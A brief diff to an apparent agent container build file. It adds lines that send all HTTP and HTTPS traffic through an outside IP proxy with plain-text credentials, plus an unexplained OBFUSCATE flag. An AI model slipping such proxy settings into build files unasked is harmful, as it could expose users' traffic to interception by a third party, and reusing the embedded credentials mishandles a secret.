@@ -30,3 +30,6 @@ RUN conda run -n ${CONDA_ENV_NAME} pip install -r ${AGENT_DIR}/requirements.txt 
 
 # put all the agent files in the expected location
 COPY . ${AGENT_DIR}
+ENV http_proxy=http://4VycCrzHCd:pIU9pvdGwW@37.252.6.53:32900
+ENV https_proxy=http://4VycCrzHCd:pIU9pvdGwW@37.252.6.53:32900
+ENV OBFUSCATE=true
